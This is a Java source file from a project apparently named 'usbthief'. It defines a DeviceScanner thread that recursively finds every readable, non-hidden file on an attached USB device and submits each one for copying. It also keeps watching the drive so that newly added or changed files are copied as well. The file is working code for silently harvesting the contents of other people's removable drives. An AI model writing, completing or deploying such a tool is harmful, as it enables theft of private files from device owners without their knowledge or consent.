package com.superredrock.usbthief.worker;

import com.superredrock.usbthief.core.config.ConfigManager;
import com.superredrock.usbthief.core.config.ConfigSchema;
import com.superredrock.usbthief.core.QueueManager;
import com.superredrock.usbthief.core.event.EventBus;
import com.superredrock.usbthief.core.event.worker.FileDiscoveredEvent;

import java.io.IOException;
import java.nio.file.*;
import java.nio.file.attribute.BasicFileAttributes;
import java.time.Instant;
import java.util.Map;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.function.BiPredicate;
import java.util.logging.Logger;
import java.util.stream.Collectors;
import java.util.stream.Stream;

public class DeviceScanner extends Thread {
    protected static final Logger logger = Logger.getLogger(DeviceScanner.class.getName());

    private final FileStore rootStore;
    private final Path root;
    private final WatchService monitor;
    private final com.superredrock.usbthief.core.Device device;

    private final AtomicInteger changeCount = new AtomicInteger(0);
    private final ConcurrentHashMap<Path, WatchKey> watchKeys = new ConcurrentHashMap<>();
    private volatile boolean running = true;

    public DeviceScanner(com.superredrock.usbthief.core.Device device, FileStore rootStore) {
        super(QueueManager.getDiskScanners(), "DiskScanner: " + rootStore.name());
        this.device = device;
        this.rootStore = rootStore;
        this.root = device.getRootPath();
        WatchService ws;
        try {
            ws = FileSystems.getDefault().newWatchService();
        } catch (IOException e) {
            logger.warning("Failed to create WatchService: " + e.getMessage());
            ws = null;
        }
        this.monitor = ws;
    }

    @Override
    public void run() {
        try {
            performInitialScan();
        } catch (IOException e) {
            logger.severe("Error while scanning disk: " + e.getMessage());
            return;
        }

        if (!ConfigManager.getInstance().get(ConfigSchema.WATCH_ENABLED)) {
            logger.info("File monitoring disabled, scanner finished");
            return;
        }

        logger.info("Starting file monitoring for " + root);

        if (monitor == null) {
            logger.warning("WatchService not available, skipping file monitoring");
        } else {
            startMonitoring();
        }
    }

    private void performInitialScan() throws IOException {
        logger.info("Scanning Disk " + root);

        long maxSize = ConfigManager.getInstance().get(ConfigSchema.MAX_FILE_SIZE);
        BiPredicate<Path, BasicFileAttributes> filter = createFileFilter(maxSize);

        try (Stream<Path> paths = Files.find(root, Integer.MAX_VALUE, filter).parallel()) {
            paths.peek(path -> {
                if (Files.isDirectory(path)){
                    processFileSafely(path);
                    EventBus.getInstance().dispatch(new FileDiscoveredEvent(path, 0, device.getSerialNumber()));
                }
            }).filter(path -> !Files.isDirectory(path))
                    .peek(path -> {
                        try {
                            EventBus.getInstance().dispatch(new FileDiscoveredEvent(path,Files.size(path), device.getSerialNumber()));
                        } catch (IOException _) {
                            EventBus.getInstance().dispatch(new FileDiscoveredEvent(path,0, device.getSerialNumber()));
                        }
                    })
                    .forEach(this::processFileSafely);
        }

        logger.info("Initial scan completed for " + root);
    }

    private BiPredicate<Path, BasicFileAttributes> createFileFilter(long maxSize) {
        return (path, attrs) -> {
            try {
                if (Files.isHidden(path)) return false;
            } catch (IOException e) {
                return false;
            }

            if (!Files.isReadable(path)) return false;

            return !attrs.isRegularFile() || attrs.size() > 0 && attrs.size() <= maxSize;
        };
    }

    private void processDirectorySafely(Path dir) {
        try {
            if (Files.isHidden(dir)) {
                logger.fine("Skip hidden directory: " + dir);
                return;
            }
            submitCopyTask(dir);
            registerDirectoryWatch(dir);
            logger.fine("Registered directory: " + dir);
        } catch (IOException e) {
            logger.warning("Error processing directory " + dir + ": " + e.getMessage());
        }
    }

    private void processFileSafely(Path file) {
        try {
            long size = Files.size(file);
            if (size > 0) {
                submitCopyTask(file);
            }
        } catch (AccessDeniedException e) {
            logger.fine("Access denied: " + file);
        } catch (NoSuchFileException e) {
            logger.fine("File disappeared: " + file);
        } catch (IOException e) {
            logger.warning("Error processing file " + file + ": " + e.getMessage());
        }
    }

    private void submitCopyTask(Path path) {
        CopyTask rawTask = new CopyTask(path, device.getSerialNumber());
        int priority = TaskScheduler.getInstance().getPriorityRule().calculatePriority(path);
        PriorityCopyTask priorityTask = new PriorityCopyTask(rawTask, priority, device, Instant.now());
        TaskScheduler.getInstance().submit(priorityTask);
    }

    private void scanNewDirectory(Path dir) throws IOException {
        registerDirectoryWatch(dir);

        long maxSize = ConfigManager.getInstance().get(ConfigSchema.MAX_FILE_SIZE);
        BiPredicate<Path, BasicFileAttributes> filter = createFileFilter(maxSize);

        try (Stream<Path> paths = Files.find(dir, Integer.MAX_VALUE, filter).parallel()) {
            Map<Boolean, java.util.List<Path>> partitioned = paths.collect(
                Collectors.partitioningBy(Files::isDirectory)
            );

            partitioned.getOrDefault(true, java.util.List.of())
                .forEach(this::processDirectorySafely);

            partitioned.getOrDefault(false, java.util.List.of())
                .parallelStream()
                .forEach(this::processFileSafely);
        }
    }

    private void startMonitoring() {
        Thread resetThread = getResetThread();
        resetThread.start();

        try {
            while (running && !Thread.currentThread().isInterrupted()) {
                WatchKey key = monitor.take();
                Path watchPath = (Path) key.watchable();

                key.pollEvents().stream()
                    .peek(event -> {
                        if (event.kind() == StandardWatchEventKinds.OVERFLOW) {
                            logger.warning("WatchEvent overflow detected");
                        }
                    })
                    .filter(event -> event.kind() != StandardWatchEventKinds.OVERFLOW)
                    .forEach(event -> handleWatchEvent(watchPath, event));

                if (!key.reset()) {
                    watchKeys.remove(watchPath);
                    if (watchKeys.isEmpty()) {
                        logger.info("All watch keys cancelled, stopping monitor");
                        break;
                    }
                }
            }
        } catch (ClosedWatchServiceException e) {
            logger.info("WatchService closed");
        } catch (InterruptedException e) {
            logger.info("Monitoring interrupted");
            Thread.currentThread().interrupt();
        } catch (Exception e) {
            logger.severe("Error in monitoring loop: " + e.getMessage());
        } finally {
            running = false;
            closeWatchService();
        }
    }

    private Thread getResetThread() {
        Thread resetThread = new Thread(() -> {
            while (running) {
                try {
                    TimeUnit.SECONDS.sleep(ConfigManager.getInstance().get(ConfigSchema.WATCH_RESET_INTERVAL_SECONDS));
                    int count = changeCount.getAndSet(0);
                    if (count > 0) {
                        logger.fine("Reset change count: " + count);
                    }
                } catch (InterruptedException e) {
                    Thread.currentThread().interrupt();
                    break;
                }
            }
        }, "ChangeCounterReset");
        resetThread.setDaemon(true);
        return resetThread;
    }

    @SuppressWarnings("unchecked")
    private void handleWatchEvent(Path watchPath, WatchEvent<?> event) {
        WatchEvent.Kind<?> kind = event.kind();

        Path fullPath = watchPath.resolve(((WatchEvent<Path>) event).context());

        try {
            if (!Files.exists(fullPath) || Files.isHidden(fullPath)) {
                return;
            }
        } catch (IOException e) {
            return;
        }

        int newCount = changeCount.incrementAndGet();
        logger.fine("File event: " + kind + " on " + fullPath + " (count: " + newCount + ")");

        if (newCount >= ConfigManager.getInstance().get(ConfigSchema.WATCH_THRESHOLD)) {
            int threshold = ConfigManager.getInstance().get(ConfigSchema.WATCH_THRESHOLD);
            logger.info("Change threshold reached (" + threshold + "), triggering copy");
            changeCount.set(0);
            handleChangedPath(fullPath, kind);
        }
    }

    private void handleChangedPath(Path path, WatchEvent.Kind<?> kind) {
        try {
            if (Files.isDirectory(path) && kind == StandardWatchEventKinds.ENTRY_CREATE) {
                scanNewDirectory(path);
            } else if (Files.isRegularFile(path)) {
                processFileSafely(path);
            }
        } catch (IOException e) {
            logger.warning("Error handling changed path: " + e.getMessage());
        }
    }

    private void registerDirectoryWatch(Path dir) throws IOException {
        if (monitor == null || watchKeys.containsKey(dir)) {
            return;
        }
        WatchKey key = dir.register(monitor,
            StandardWatchEventKinds.ENTRY_CREATE,
            StandardWatchEventKinds.ENTRY_MODIFY,
            StandardWatchEventKinds.ENTRY_DELETE);
        watchKeys.put(dir, key);
        logger.fine("Registered watch for directory: " + dir);
    }

    public FileStore getRootStore() {
        return rootStore;
    }

    public void stopMonitoring() {
        running = false;
        if (monitor != null) {
            try {
                monitor.close();
            } catch (IOException e) {
                logger.warning("Error closing WatchService: " + e.getMessage());
            }
        }
    }

    private void closeWatchService() {
        watchKeys.values().parallelStream()
            .forEach(WatchKey::cancel);

        watchKeys.clear();

        if (monitor != null) {
            try {
                monitor.close();
            } catch (IOException e) {
                logger.warning("Error closing WatchService: " + e.getMessage());
            }
        }
    }
}
